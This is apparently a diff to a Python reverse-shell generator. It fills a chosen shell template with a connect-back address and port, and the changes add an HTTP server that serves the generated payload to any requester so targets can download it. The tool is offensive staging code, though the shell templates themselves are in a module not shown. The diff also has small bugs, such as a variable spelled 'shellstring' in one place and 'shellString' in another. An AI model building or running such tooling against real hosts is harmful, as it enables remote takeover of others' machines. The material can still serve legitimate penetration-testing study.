@@ -1,5 +1,17 @@
 import argparse
 import shells
+import http.server
+import socketserver
+
+shellstring = 'noShell'
+
+class ShellHandler(http.server.BaseHTTPRequestHandler):
+    
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-type", "text/html")
+        self.end_headers()
+        self.wfile.write(shellString.encode())
 
 def printShells(help=''):
     print('Available shells:')
@@ -13,6 +25,7 @@ parser.add_argument('shell', metavar='shellLanguage', type=str,
 parser.add_argument('-i', dest='localAddr', help='Address to connect back to')
 parser.add_argument('-p', dest='localPort', help='Port to connect back to')
 parser.add_argument('-o', dest='outfile', help='File to write the reverse shell to')
+parser.add_argument('--httpport', dest='httpPort', help='Port to start HTTP server in', default=80)
 
 args = parser.parse_args()
 results = list(filter(lambda shell: shell['name'] == args.shell, shells.shells))
@@ -38,4 +51,7 @@ if args.outfile:
     outfile.write(shellContents)
 else:
     print (shellContents)
+shellString = shellContents
+with socketserver.TCPServer(("", args.httpPort), ShellHandler) as httpd:
+    httpd.serve_forever()
 
